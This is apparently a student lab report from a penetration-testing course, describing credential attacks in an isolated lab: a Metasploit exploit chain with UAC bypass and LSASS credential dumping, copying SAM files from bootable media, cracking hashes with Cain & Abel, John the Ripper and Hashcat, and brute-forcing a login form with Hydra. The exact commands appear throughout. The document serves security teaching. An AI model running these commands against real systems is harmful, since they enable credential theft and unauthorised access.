# Lab 06 — Attacks on Authentication

**Course:** CIS*6540 — Advanced Penetration Testing and Exploit Development  
**Institution:** University of Guelph  
**Author:** Sumesh Kumar (`prashersumesh`)  
**Date:** July 2026  
**Environment:** Operation Shadow Hunt Lab

---

## Overview

Four-part lab demonstrating offline and online password attacks across Windows and Linux targets. Covers credential extraction from memory, NTLM hash cracking, Linux shadow file cracking, and HTTP-form brute-force.

---

## Lab Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux 2026.1 — `192.168.80.135` |
| Target (Windows 7) | `SUMESHKUMAR-PC` — `192.168.80.154` |
| Target (Windows Server 2016) | `WIN-JH4082NO9JH` — `192.168.80.156` |
| Network | VMware host-only — `192.168.80.0/24` |
| Host | Dell Precision — VMware Workstation |

---

## Part 1 — Credential Extraction via Kiwi (Meterpreter)

**Attack chain:** Icecast buffer overflow → Meterpreter shell → privilege escalation (bypassuac_eventvwr) → NT AUTHORITY\SYSTEM → Kiwi loaded → `creds_all`

**Commands:**
```
use exploit/windows/http/icecast_header
use post/multi/manage/shell_to_meterpreter
use exploit/windows/local/bypassuac_eventvwr
load kiwi
creds_all
```

**Result:** WDigest caching enabled on Windows 7 target. Plaintext credential extracted directly from LSASS memory.

| Username | Domain | Plaintext Password |
|---|---|---|
| Sumesh Kumar | SumeshKumar-PC | Kakasharma@19012 |

**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory

### Screenshot
![Kiwi creds_all output](screenshots/kiwi_passwords.jpg)
*creds_all output — plaintext password visible in wdigest, tspkg, and kerberos sections*

---

## Part 2a — NTLM Hash Cracking (Cain & Abel)

**File:** `sam_win7` (PWDUMP format — post-exploitation pull from Windows 7 target)

**Steps:**
1. Installed Cain & Abel v4.9.56 on Server 2016
2. Imported `sam_win7` via: Cracker → LM & NTLM Hashes → Add to list → Import Hashes from text file (PWDUMP format)
3. Dictionary attack using `rockyou.txt` — 5/6 cracked in under 3 minutes
4. `daddy` hash submitted to CrackStation.net (NTLM rainbow table lookup) → cracked

**Results:**

| Username | NT Hash (truncated) | Password | Method |
|---|---|---|---|
| anotherbaby | FB4BF3DDF37C... | princess | rockyou dictionary |
| baby | F2477A144DFF... | monkey | rockyou dictionary |
| bigbro | 4C090B2A4A9A... | babygirl | rockyou dictionary |
| biggerbro | 328727B81CA0... | 1234567 | rockyou dictionary |
| bigsis | 9EBD81FA14D6... | heaven | rockyou dictionary |
| daddy | 1C39AC8DC496... | rainbowchicken | CrackStation lookup |

**MITRE:** T1110.002 — Brute Force: Password Cracking

### Screenshots
![Cain & Abel results](screenshots/ca_win7.jpg)
*Cain & Abel — LM & NTLM Hashes panel with 5 cracked NT passwords visible*

![CrackStation — daddy](screenshots/daddy_crackstation.jpg)
*CrackStation NTLM lookup — hash `1C39AC8DC496087B13267C726C3AE958` → `rainbowchicken`*

---

## Part 2b — Physical Access: SAM Extraction via Bootable Media

No credentials or vulnerabilities required. Procedure:

1. Boot Windows Server 2016 from Kali Linux live USB
2. Identify Windows partition: `fdisk -l`
3. Mount: `mount /dev/sda2 /mnt/windows`
4. Navigate: `cd /mnt/windows/Windows/System32/config/`
5. Copy: `cp SAM SYSTEM /media/usb/`
6. Extract hashes offline: `samdump2 SYSTEM SAM > hashes.txt`
7. Import `hashes.txt` into Cain & Abel or Hashcat for cracking

**Constraint:** BitLocker full-disk encryption blocks step 3. Absent encryption, physical access alone enables full credential extraction.

---

## Part 3a — Linux Password Cracking: John the Ripper

**File:** `shadow_ubuntu8` (MD5crypt — `$1$` — Ubuntu 8)

**Commands:**
```bash
john ~/Desktop/shadow_ubuntu8
john ~/Desktop/shadow_ubuntu8 --wordlist=/usr/share/wordlists/rockyou.txt
john ~/Desktop/shadow_ubuntu8 --show
```

**Results — 6/7 cracked:**

| Username | Hash Type | Password |
|---|---|---|
| baby | md5crypt | iloveyou |
| anotherbaby | md5crypt | spiderman |
| yetanotherbaby | md5crypt | prince |
| bigbro | md5crypt | harrypotter |
| biggerbro | md5crypt | gangsta |
| bigsis | md5crypt | newyork |
| daddy | md5crypt | not cracked (rockyou exhausted) |

**MITRE:** T1110.002 — Brute Force: Password Cracking

### Screenshot
![JtR output](screenshots/jtr_ubuntu8.jpg)
*john --show output — 6 passwords cracked, 1 remaining*

---

## Part 3b — Linux Password Cracking: Hashcat

**File:** `shadow_ubuntu18` (SHA-256crypt — `$5$` — Ubuntu 18.04)  
**Mode:** `-m 7400`

**Commands:**
```bash
cut -d: -f2 ~/Desktop/shadow_ubuntu18 > ~/Desktop/hashes18.txt
hashcat -m 7400 ~/Desktop/hashes18.txt /usr/share/wordlists/rockyou.txt
hashcat -m 7400 ~/Desktop/hashes18.txt /usr/share/wordlists/rockyou.txt --show
```

**Results — 7/7 cracked (full bonus):**

| Username | Hash Type | Password | Runtime |
|---|---|---|---|
| anotherbaby | sha256crypt | password | <1 min |
| baby | sha256crypt | loveme | <1 min |
| yetanotherbaby | sha256crypt | angel | <1 min |
| bigbro | sha256crypt | jordan | <1 min |
| biggerbro | sha256crypt | sunshine | <1 min |
| bigsis | sha256crypt | basketball | <1 min |
| daddy | sha256crypt | diamondforever | ~5 min (isolated run at 4.67% of rockyou) |

**MITRE:** T1110.002 — Brute Force: Password Cracking

### Screenshot
![Hashcat output](screenshots/hc_ubuntu18.jpg)
*hashcat --show output — all 7 SHA-256crypt hashes cracked including daddy=diamondforever*

---

## Part 4a — XAMPP Deployment (Login Target Setup)

**Target:** Windows Server 2016 — `192.168.80.156`

1. Installed XAMPP 7.2.26 (x64) — Apache only
2. Deployed `login.html` + `login.php` to `C:\xampp\htdocs\`
3. Edited `login.php` credentials: `$usr="Sumesh"; $pwd="Kumar";`
4. Started Apache — confirmed accessible on port 80
5. Verified login from localhost — response: `Login successful`

**POST field map (confirmed from source):**

| Field | Value |
|---|---|
| uname | username |
| pass | password |
| hiddenfield | myhiddenfield |
| Failure string | Failed |

---

## Part 4b — HTTP Form Brute-Force: Hydra

**Target:** `http://192.168.80.156/login.php`  
**Tool:** Hydra v9.6

**Wordlists:**
```bash
echo -e "Sumesh\nwronguser" > ~/Desktop/users.txt
echo -e "Kumar\nwrongpassword" > ~/Desktop/passwords.txt
```

**Attack command:**
```bash
hydra -L ~/Desktop/users.txt -P ~/Desktop/passwords.txt 192.168.80.156 \
  http-post-form "/login.php:uname=^USER^&pass=^PASS^&hiddenfield=myhiddenfield:Failed"
```

**Result:** 4 attempts (2 users × 2 passwords). 1 valid credential identified.

```
[80][http-post-form] host: 192.168.80.156   login: Sumesh   password: Kumar
1 of 1 target successfully completed, 1 valid password found
```

**MITRE:** T1110.001 — Brute Force: Password Guessing

### Screenshot
![Hydra output](screenshots/hydra_online_attack.jpg)
*Hydra terminal — full command visible, login: Sumesh / password: Kumar confirmed*

---

## MITRE ATT&CK Summary

| Technique | ID | Tool Used |
|---|---|---|
| OS Credential Dumping: LSASS Memory | T1003.001 | Kiwi (Mimikatz) |
| Brute Force: Password Cracking | T1110.002 | Cain & Abel, JtR, Hashcat |
| Brute Force: Password Guessing | T1110.001 | Hydra |
| Valid Accounts | T1078 | All phases |

---

## Repository Structure

```
Lab06-Attacks-on-Authentication/
├── README.md
├── lab06_report.html
├── lab06.pdf
└── screenshots/
    ├── kiwi_passwords.jpg
    ├── ca_win7.jpg
    ├── jtr_ubuntu8.jpg
    ├── hc_ubuntu18.jpg
    ├── hydra_online_attack.jpg
    └── daddy_crackstation.jpg
```

---

## Key Takeaways

- WDigest caching on legacy Windows systems exposes plaintext credentials in LSASS — disabled by default on Windows 8.1+
- NTLM hashes with weak passwords crack in seconds with rockyou.txt; SHA-256crypt is significantly slower but still falls to dictionary attacks
- HTTP form endpoints with no rate-limiting or lockout are trivially brute-forced with Hydra
- Physical access without full-disk encryption (BitLocker) enables complete credential extraction with zero exploitation

---

*Part of Operation Shadow Hunt — CIS\*6540 Lab Series | University of Guelph | Summer 2026*  
*GitHub: [prashersumesh](https://github.com/prashersumesh)*
